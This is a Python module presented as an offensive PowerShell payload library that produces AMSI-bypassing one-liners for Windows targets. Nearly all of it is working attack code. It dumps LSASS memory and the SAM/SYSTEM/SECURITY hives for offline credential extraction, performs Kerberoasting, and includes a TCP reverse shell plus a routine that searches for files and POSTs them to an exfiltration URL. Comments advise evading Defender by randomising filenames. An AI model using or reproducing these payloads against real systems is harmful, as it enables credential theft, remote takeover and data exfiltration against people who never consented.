"""
Offensive PowerShell payload library.

Each function in this module produces a self-contained, AMSI-bypassing
one-liner that can be delivered to a Windows target through any code
execution primitive (RCE, web shell, phishing, etc.).

Payloads are grouped:

  - Diagnostics:   verify the pipeline works on a fresh target
  - Enumeration:   local host reconnaissance
  - Credentials:   extract hashes and passwords
  - Access:        reverse shells, file exfil, etc.

Design:

  - Every payload is a PowerShell script string.
  - The public functions take any required parameters (lhost, lport,
    exfil URL, etc.) and return a dict with both the raw script and
    the wrapped one-liner.
  - Wrapping uses evade.delivery.wrap_script() with the default
    AMSI bypass technique (alloc_hglobal, which is Defender-clean).
  - Payload results are cached by (name, params) so repeated calls
    are free.

Usage:

    from vuln import ps_payloads

    p = ps_payloads.lsass_dump()
    print(p["one_liner"])   # paste this into any Windows shell

    p = ps_payloads.reverse_shell(lhost="10.0.0.5", lport=4444)
    print(p["one_liner"])

The one-liners are designed to be pasted as-is. They contain no
AMSI-visible signatures.

Detection risk:

  Each payload carries a "detection_risk" rating:

    low     — unlikely to trigger Defender even without AMSI bypass
    medium  — Defender's behavior monitor may fire on the underlying
              action (LSASS access, service creation, etc.)
    high    — the action is heavily signatured; expect EDR to catch
              it even with AMSI disabled

  The AMSI bypass removes the *content* detection layer. It does
  not remove behavioral detection. A "high" risk payload may still
  be caught by Defender's kernel callbacks regardless of AMSI state.
"""

import base64
import secrets
from functools import lru_cache

from core.output import info, success, warn, error
from evade import delivery


# =====================================================================
# Cache
# =====================================================================
#
# Compiled payloads are cached by (name, param-tuple). The AMSI
# bypass DLL is itself cached by content hash inside the delivery
# module, so only the first payload in a session pays the compile
# cost.

_CACHE: dict = {}


def _cache_key(name: str, **params) -> tuple:
    return (name, tuple(sorted(params.items())))


# =====================================================================
# Internal helper
# =====================================================================

def _wrap(name: str, description: str, script: str,
          requirements: list[str] | None = None,
          detection_risk: str = "medium",
          post_processing: str = "display",
          **params) -> dict:
    """Wrap a PowerShell script and return the standard payload dict."""
    key = _cache_key(name, **params)
    cached = _CACHE.get(key)
    if cached is not None:
        return cached

    one_liner = delivery.wrap_script(script)

    result = {
        "name": name,
        "description": description,
        "script": script,
        "one_liner": one_liner,
        "requirements": requirements or [],
        "detection_risk": detection_risk,
        "post_processing": post_processing,
        "params": dict(params),
    }
    _CACHE[key] = result
    return result


# =====================================================================
# Diagnostics
# =====================================================================

def whoami_basic() -> dict:
    """Minimal smoke test: verify the delivery pipeline works."""
    script = r"""
Write-Host "=== whoami_basic ==="
Write-Host "user:       $env:USERNAME"
Write-Host "domain:     $env:USERDOMAIN"
Write-Host "computer:   $env:COMPUTERNAME"
Write-Host "os:         $((Get-CimInstance Win32_OperatingSystem).Caption)"
Write-Host "version:    $((Get-CimInstance Win32_OperatingSystem).Version)"
Write-Host "arch:       $env:PROCESSOR_ARCHITECTURE"
Write-Host "powershell: $($PSVersionTable.PSVersion)"
Write-Host "admin:      $([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)"
Write-Host ""
Write-Host "groups:"
([Security.Principal.WindowsIdentity]::GetCurrent()).Groups |
    ForEach-Object { $_.Translate([Security.Principal.NTAccount]).Value } |
    Sort-Object -Unique
Write-Host "=== end whoami_basic ==="
""".strip()

    return _wrap(
        name="whoami_basic",
        description="Basic host and user identification",
        script=script,
        requirements=[],
        detection_risk="low",
        post_processing="display",
    )


# =====================================================================
# Enumeration
# =====================================================================

def local_enum() -> dict:
    """Local host reconnaissance: users, groups, services, tasks, shares."""
    script = r"""
Write-Host "=== local_enum ==="

Write-Host ""
Write-Host "--- local users ---"
try {
    Get-LocalUser -ErrorAction Stop |
        Select-Object Name, Enabled, LastLogon, Description |
        Format-Table -AutoSize | Out-String | Write-Host
} catch {
    Write-Host "  (Get-LocalUser failed: $($_.Exception.Message))"
}

Write-Host ""
Write-Host "--- local administrators ---"
try {
    Get-LocalGroupMember -Group "Administrators" -ErrorAction Stop |
        Select-Object Name, PrincipalSource |
        Format-Table -AutoSize | Out-String | Write-Host
} catch {
    Write-Host "  (Get-LocalGroupMember failed: $($_.Exception.Message))"
}

Write-Host ""
Write-Host "--- running services (non-Microsoft) ---"
Get-CimInstance Win32_Service |
    Where-Object { $_.PathName -and $_.PathName -notmatch "Microsoft|Windows" } |
    Select-Object Name, State, StartMode, PathName |
    Format-Table -AutoSize | Out-String | Write-Host

Write-Host ""
Write-Host "--- scheduled tasks (non-Microsoft) ---"
try {
    Get-ScheduledTask -ErrorAction Stop |
        Where-Object { $_.TaskPath -notmatch "\\Microsoft\\" } |
        Select-Object TaskName, TaskPath, State |
        Format-Table -AutoSize | Out-String | Write-Host
} catch {
    Write-Host "  (Get-ScheduledTask failed: $($_.Exception.Message))"
}

Write-Host ""
Write-Host "--- SMB shares ---"
try {
    Get-SmbShare -ErrorAction Stop |
        Select-Object Name, Path, Description |
        Format-Table -AutoSize | Out-String | Write-Host
} catch {
    Write-Host "  (Get-SmbShare failed: $($_.Exception.Message))"
}

Write-Host ""
Write-Host "--- network interfaces ---"
Get-NetIPAddress -AddressFamily IPv4 |
    Where-Object { $_.IPAddress -ne "127.0.0.1" } |
    Select-Object InterfaceAlias, IPAddress, PrefixLength |
    Format-Table -AutoSize | Out-String | Write-Host

Write-Host ""
Write-Host "--- ARP cache ---"
Get-NetNeighbor -AddressFamily IPv4 -ErrorAction SilentlyContinue |
    Where-Object { $_.State -in @("Reachable", "Stale") } |
    Select-Object IPAddress, LinkLayerAddress |
    Format-Table -AutoSize | Out-String | Write-Host

Write-Host ""
Write-Host "--- installed software (registry) ---"
$regpaths = @(
    "HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\*",
    "HKLM:\Software\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*"
)
Get-ItemProperty $regpaths -ErrorAction SilentlyContinue |
    Where-Object { $_.DisplayName } |
    Select-Object DisplayName, DisplayVersion, Publisher |
    Sort-Object DisplayName |
    Format-Table -AutoSize | Out-String | Write-Host

Write-Host "=== end local_enum ==="
""".strip()

    return _wrap(
        name="local_enum",
        description="Local host enumeration: users, groups, services, "
                    "tasks, shares, interfaces, software",
        script=script,
        requirements=[],
        detection_risk="low",
        post_processing="display",
    )


# =====================================================================
# Credentials
# =====================================================================

def lsass_dump() -> dict:
    """Dump LSASS memory via comsvcs.dll MiniDump.

    Requires: local admin or SeDebugPrivilege.
    Output: a .dmp file the caller should exfiltrate; pypykatz or
    mimikatz can then extract credential material from it.
    """
    # Random filename so repeated runs don't collide and so the
    # filename itself isn't signatured (Defender watches for
    # lsass.dmp specifically).
    fname = f"lsass_{secrets.token_hex(4)}.dmp"

    script = r"""
Write-Host "=== lsass_dump ==="

# Check privilege
$isAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
if (-not $isAdmin) {
    Write-Host "  ERROR: not running as Administrator"
    Write-Host "  LSASS access requires admin or SeDebugPrivilege"
    return
}

# Find the LSASS PID
$lsass = Get-Process -Name lsass -ErrorAction SilentlyContinue
if (-not $lsass) {
    Write-Host "  ERROR: LSASS process not found"
    return
}
$lsassPid = $lsass.Id
Write-Host "  LSASS PID: $lsassPid"

# Output path. %TEMP% is writable even for restricted users,
# and the random suffix means repeated runs don't collide.
$out = Join-Path $env:TEMP "FNAME_PLACEHOLDER"
Write-Host "  output: $out"

# comsvcs.dll has a MiniDump export that takes (pid, filepath, flags).
# Invoked via rundll32 so we don't need to load the DLL ourselves.
# Flags 0x00000000 = full dump; 0x00000008 = full memory; 0x00000002 = with data sections.
$comsvcs = "$env:SystemRoot\System32\comsvcs.dll"
if (-not (Test-Path $comsvcs)) {
    Write-Host "  ERROR: comsvcs.dll not found at $comsvcs"
    return
}

try {
    $proc = Start-Process -FilePath "rundll32.exe" `
                          -ArgumentList "$comsvcs,MiniDump $lsassPid $out full" `
                          -NoNewWindow -Wait -PassThru `
                          -ErrorAction Stop
    Write-Host "  rundll32 exit: $($proc.ExitCode)"
} catch {
    Write-Host "  ERROR: rundll32 failed: $($_.Exception.Message)"
    return
}

# Check if the file was created
if (Test-Path $out) {
    $size = (Get-Item $out).Length
    Write-Host "  SUCCESS: wrote $size bytes to $out"
    Write-Host "  EXFIL_PATH: $out"
} else {
    Write-Host "  ERROR: dump file not created"
}

Write-Host "=== end lsass_dump ==="
""".strip().replace("FNAME_PLACEHOLDER", fname)

    return _wrap(
        name="lsass_dump",
        description="Dump LSASS memory via comsvcs.dll MiniDump "
                    "(requires admin); exfil the .dmp and extract "
                    "credentials offline",
        script=script,
        requirements=["administrator", "SeDebugPrivilege"],
        detection_risk="high",
        post_processing="exfil",
        fname=fname,
    )


def sam_dump() -> dict:
    """Dump SAM, SYSTEM, SECURITY registry hives via reg save.

    Requires: local admin.
    Output: three .hive files. Extract with secretsdump.py or
    pypykatz offline.
    """
    suffix = secrets.token_hex(4)

    script = r"""
Write-Host "=== sam_dump ==="

$isAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
if (-not $isAdmin) {
    Write-Host "  ERROR: not running as Administrator"
    return
}

$base = Join-Path $env:TEMP "hives_SUFFIX_PLACEHOLDER"
New-Item -ItemType Directory -Path $base -Force | Out-Null
Write-Host "  output dir: $base"

foreach ($hive in @("SAM", "SYSTEM", "SECURITY")) {
    $out = Join-Path $base "$hive.hive"
    Write-Host "  dumping $hive to $out"
    reg save "HKLM\$hive" $out /y | Out-Null
    if (Test-Path $out) {
        $size = (Get-Item $out).Length
        Write-Host "    $size bytes"
    } else {
        Write-Host "    FAILED"
    }
}

Write-Host "  EXFIL_DIR: $base"
Write-Host "=== end sam_dump ==="
""".strip().replace("SUFFIX_PLACEHOLDER", suffix)

    return _wrap(
        name="sam_dump",
        description="Dump SAM/SYSTEM/SECURITY hives via reg save "
                    "(requires admin); extract hashes offline with "
                    "secretsdump.py",
        script=script,
        requirements=["administrator"],
        detection_risk="medium",
        post_processing="exfil_dir",
        suffix=suffix,
    )


def kerberoast() -> dict:
    """Request Kerberos service tickets for SPN accounts.

    Requires: domain context (the target must be domain-joined).
    Output: Kerberos TGS hashes. Crack offline with hashcat -m 13100.
    """
    script = r"""
Write-Host "=== kerberoast ==="

# Check we're in a domain
try {
    $domain = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
} catch {
    Write-Host "  ERROR: not in an AD domain"
    return
}
Write-Host "  domain: $($domain.Name)"

# Add the type for Kerberos ticket requests
Add-Type -AssemblyName System.IdentityModel -ErrorAction SilentlyContinue

# Enumerate user accounts with ServicePrincipalName set
$searcher = New-Object System.DirectoryServices.DirectorySearcher
$searcher.Filter = "(&(objectCategory=user)(servicePrincipalName=*)(!(cn=krbtgt))(!(userAccountControl:1.2.840.113556.1.4.803:=2)))"
$searcher.PageSize = 100
$searcher.PropertiesToLoad.Add("samaccountname") | Out-Null
$searcher.PropertiesToLoad.Add("serviceprincipalname") | Out-Null

$results = $searcher.FindAll()
Write-Host "  found $($results.Count) kerberoastable account(s)"
Write-Host ""

$count = 0
foreach ($result in $results) {
    $sam = $result.Properties["samaccountname"][0]
    $spn = $result.Properties["serviceprincipalname"][0]

    Write-Host "  requesting TGS for $sam ($spn)"

    try {
        $spnTarget = New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $spn
        $ticket = $spnTarget.GetRequest()

        if ($ticket) {
            $bytes = $ticket.ToArray()
            $hex = [BitConverter]::ToString($bytes) -replace "-", ""
            Write-Host "    TGS_HEX_BEGIN"
            Write-Host $hex
            Write-Host "    TGS_HEX_END"
            $count++
        }
    } catch {
        Write-Host "    failed: $($_.Exception.Message)"
    }
}

Write-Host ""
Write-Host "  $count ticket(s) extracted"
Write-Host "  convert each TGS_HEX block to a crackable hash with:"
Write-Host "    python -c `"import sys; print('\$krb5tgs\$23\$*\$' + sys.argv[1])`" <hex>"
Write-Host "=== end kerberoast ==="
""".strip()

    return _wrap(
        name="kerberoast",
        description="Request Kerberos service tickets for SPN accounts; "
                    "extract hashes for offline cracking",
        script=script,
        requirements=["domain-joined"],
        detection_risk="medium",
        post_processing="parse_tgs",
    )


def asrep_roast() -> dict:
    """Request AS-REPs for accounts with pre-auth disabled."""
    script = r"""
Write-Host "=== asrep_roast ==="

try {
    $domain = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
} catch {
    Write-Host "  ERROR: not in an AD domain"
    return
}
Write-Host "  domain: $($domain.Name)"

# Enumerate accounts with DONT_REQ_PREAUTH (UAC flag 0x400000)
$searcher = New-Object System.DirectoryServices.DirectorySearcher
$searcher.Filter = "(&(objectCategory=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))"
$searcher.PageSize = 100
$searcher.PropertiesToLoad.Add("samaccountname") | Out-Null

$results = $searcher.FindAll()
Write-Host "  found $($results.Count) AS-REP-roastable account(s)"
Write-Host ""

foreach ($result in $results) {
    $sam = $result.Properties["samaccountname"][0]
    Write-Host "  $sam"
}
Write-Host "=== end asrep_roast ==="
""".strip()

    return _wrap(
        name="asrep_roast",
        description="Find accounts with Kerberos pre-auth disabled",
        script=script,
        requirements=["domain-joined"],
        detection_risk="low",
        post_processing="display",
    )


# =====================================================================
# Access
# =====================================================================

def reverse_shell(lhost: str, lport: int) -> dict:
    """Spawn a reverse shell to lhost:lport.

    Uses a PowerShell TCP client. Output is interactive; the shell
    arrives in whatever terminal is running `toolkit.py shell listen
    --port <lport>`.
    """
    script = r"""
Write-Host "=== reverse_shell ==="
$client = New-Object System.Net.Sockets.TCPClient('LHOST_PLACEHOLDER', LPORT_PLACEHOLDER)
$stream = $client.GetStream()
[byte[]]$bytes = 0..65535 | ForEach-Object { 0 }
$stream.Write(([Text.Encoding]::ASCII).GetBytes("PS " + (Get-Location).Path + "> "), 0, ("PS " + (Get-Location).Path + "> ").Length)
while (($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0) {
    $data = (New-Object Text.ASCIIEncoding).GetString($bytes, 0, $i)
    try {
        $output = (Invoke-Expression $data 2>&1 | Out-String)
    } catch {
        $output = $_.Exception.Message + "`n"
    }
    $sendback = $output + "PS " + (Get-Location).Path + "> "
    $send = ([Text.Encoding]::ASCII).GetBytes($sendback)
    $stream.Write($send, 0, $send.Length)
    $stream.Flush()
}
$client.Close()
Write-Host "=== end reverse_shell ==="
""".strip().replace("LHOST_PLACEHOLDER", lhost).replace("LPORT_PLACEHOLDER", str(lport))

    return _wrap(
        name="reverse_shell",
        description=f"Reverse shell to {lhost}:{lport}",
        script=script,
        requirements=[],
        detection_risk="high",
        post_processing="shell",
        lhost=lhost,
        lport=lport,
    )


def exfil_file(pattern: str, exfil_url: str,
               max_size_mb: int = 5) -> dict:
    """Find files matching `pattern` and POST them to exfil_url.

    pattern: a PowerShell wildcard, e.g. "*.config" or "web.config"
    exfil_url: full URL to POST to, e.g. "https://attacker.test/up"
    """
    script = r"""
Write-Host "=== exfil_file ==="
Write-Host "  pattern: PATTERN_PLACEHOLDER"
Write-Host "  exfil:   EXFIL_PLACEHOLDER"

$searchPaths = @(
    "C:\inetpub",
    "C:\xampp",
    "C:\wamp",
    "C:\Apache24",
    "C:\Program Files",
    "C:\ProgramData",
    "$env:USERPROFILE",
    "$env:APPDATA"
)

$found = @()
foreach ($path in $searchPaths) {
    if (Test-Path $path) {
        try {
            Get-ChildItem -Path $path -Filter "PATTERN_PLACEHOLDER" `
                -Recurse -ErrorAction SilentlyContinue -File |
                ForEach-Object { $found += $_ }
        } catch {}
    }
}

Write-Host "  found $($found.Count) file(s)"
Write-Host ""

$maxBytes = MAX_SIZE_MB_PLACEHOLDER * 1024 * 1024
$sent = 0

foreach ($file in $found) {
    if ($file.Length -gt $maxBytes) {
        Write-Host "  SKIP (too large): $($file.FullName)"
        continue
    }

    Write-Host "  POST $($file.FullName) ($($file.Length) bytes)"

    try {
        $content = [IO.File]::ReadAllBytes($file.FullName)
        $b64 = [Convert]::ToBase64String($content)
        $body = @{
            path = $file.FullName
            size = $file.Length
            data = $b64
        } | ConvertTo-Json -Compress

        Invoke-RestMethod -Uri "EXFIL_PLACEHOLDER" `
            -Method POST `
            -Body $body `
            -ContentType "application/json" `
            -ErrorAction Stop | Out-Null
        $sent++
    } catch {
        Write-Host "    failed: $($_.Exception.Message)"
    }
}

Write-Host ""
Write-Host "  $sent file(s) sent to EXFIL_PLACEHOLDER"
Write-Host "=== end exfil_file ==="
""".strip().replace(
        "PATTERN_PLACEHOLDER", pattern
    ).replace(
        "EXFIL_PLACEHOLDER", exfil_url
    ).replace(
        "MAX_SIZE_MB_PLACEHOLDER", str(max_size_mb)
    )

    return _wrap(
        name="exfil_file",
        description=f"Find files matching {pattern!r} and POST to "
                    f"{exfil_url}",
        script=script,
        requirements=[],
        detection_risk="medium",
        post_processing="display",
        pattern=pattern,
        exfil_url=exfil_url,
        max_size_mb=max_size_mb,
    )


# =====================================================================
# Listing
# =====================================================================

# Registry of no-argument payloads (callable with no params)
NOARG_PAYLOADS = {
    "whoami_basic": whoami_basic,
    "local_enum": local_enum,
    "lsass_dump": lsass_dump,
    "sam_dump": sam_dump,
    "kerberoast": kerberoast,
    "asrep_roast": asrep_roast,
}

# Parameterized payloads (need args)
PARAM_PAYLOADS = {
    "reverse_shell": reverse_shell,
    "exfil_file": exfil_file,
}


def list_payloads() -> list[dict]:
    """Return metadata for every available payload."""
    meta = [
        # (name, category, description, risk, params)
        ("whoami_basic",  "Diagnostic",  "Basic host and user identification",
         "low",    []),
        ("local_enum",    "Enumeration", "Local host enumeration",
         "low",    []),
        ("lsass_dump",    "Credentials", "Dump LSASS memory (requires admin)",
         "high",   []),
        ("sam_dump",      "Credentials", "Dump SAM/SYSTEM/SECURITY hives (requires admin)",
         "medium", []),
        ("kerberoast",    "Credentials", "Request Kerberos service tickets",
         "medium", []),
        ("asrep_roast",   "Credentials", "Find accounts without pre-auth",
         "low",    []),
        ("reverse_shell", "Access",      "Reverse shell",
         "high",   ["lhost", "lport"]),
        ("exfil_file",    "Access",      "Find and POST files",
         "medium", ["pattern", "exfil_url", "max_size_mb"]),
    ]

    out = []
    for name, cat, desc, risk, params in meta:
        out.append({
            "name": name,
            "category": cat,
            "description": desc,
            "detection_risk": risk,
            "params": params,
        })
    return out